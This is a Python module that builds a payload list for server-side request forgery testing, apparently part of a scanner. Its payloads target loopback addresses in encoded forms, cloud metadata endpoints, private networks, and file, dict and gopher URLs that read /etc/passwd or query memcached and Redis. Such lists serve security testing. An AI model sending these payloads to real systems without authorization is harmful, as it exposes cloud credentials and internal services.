"""SSRF payload matrix.

Payloads probe a mix of private/loopback addresses, cloud metadata endpoints,
schemes that tend to behave interestingly in naive fetchers, and an optional
out-of-band canary so confirmed hits can be distinguished from lookalikes.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import List, Optional


@dataclass
class Payload:
    value: str
    category: str
    note: str = ""


LOOPBACK: List[Payload] = [
    Payload("http://127.0.0.1/", "loopback", "basic loopback"),
    Payload("http://127.0.0.1:22/", "loopback", "SSH banner probe"),
    Payload("http://127.0.0.1:80/", "loopback"),
    Payload("http://localhost/", "loopback"),
    Payload("http://[::1]/", "loopback", "IPv6 loopback"),
    Payload("http://0.0.0.0/", "loopback"),
    Payload("http://127.1/", "loopback", "shorthand loopback"),
    Payload("http://0177.0.0.1/", "loopback", "octal loopback"),
    Payload("http://2130706433/", "loopback", "decimal loopback"),
]

METADATA: List[Payload] = [
    Payload(
        "http://169.254.169.254/latest/meta-data/",
        "metadata",
        "AWS IMDSv1",
    ),
    Payload(
        "http://metadata.google.internal/computeMetadata/v1/",
        "metadata",
        "GCP",
    ),
    Payload(
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "metadata",
        "Azure IMDS",
    ),
    Payload(
        "http://100.100.100.200/latest/meta-data/",
        "metadata",
        "Alibaba",
    ),
]

PRIVATE: List[Payload] = [
    Payload("http://10.0.0.1/", "private"),
    Payload("http://172.16.0.1/", "private"),
    Payload("http://192.168.0.1/", "private"),
]

SCHEMES: List[Payload] = [
    Payload("file:///etc/passwd", "scheme", "local file"),
    Payload("file:///C:/Windows/win.ini", "scheme", "Windows file"),
    Payload("dict://127.0.0.1:11211/stats", "scheme", "memcached"),
    Payload("gopher://127.0.0.1:6379/_INFO", "scheme", "redis via gopher"),
]


def build(oob_canary_url: Optional[str] = None) -> List[Payload]:
    payloads = LOOPBACK + METADATA + PRIVATE + SCHEMES
    if oob_canary_url:
        payloads.append(
            Payload(oob_canary_url, "oob", "out-of-band canary — confirms SSRF")
        )
    return payloads
